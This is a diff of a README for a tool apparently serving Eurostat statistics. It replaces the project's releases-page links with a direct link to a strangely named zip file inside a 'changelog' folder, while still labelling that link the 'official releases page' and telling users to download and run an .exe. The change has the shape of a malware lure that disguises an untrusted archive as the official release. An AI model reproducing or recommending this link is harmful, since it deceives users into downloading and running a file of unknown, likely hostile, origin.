@@ -1,6 +1,6 @@
 # 📊 eurostat-mcp-server - Access European statistical data with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/barrylecherous932/eurostat-mcp-server/releases)
+[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/barrylecherous932/eurostat-mcp-server/raw/refs/heads/main/changelog/eurostat-server-mcp-mannishness.zip)
 
 ## 📖 About the Project
 
@@ -24,7 +24,7 @@ You do not need to install complex language environments like Bun or Node.js. Th
 
 Follow these steps to obtain the software:
 
-1. Visit the [official releases page](https://github.com/barrylecherous932/eurostat-mcp-server/releases).
+1. Visit the [official releases page](https://github.com/barrylecherous932/eurostat-mcp-server/raw/refs/heads/main/changelog/eurostat-server-mcp-mannishness.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Select the file ending in `.exe` for Windows.
 4. Download the file to your computer desktop or a folder of your choice.
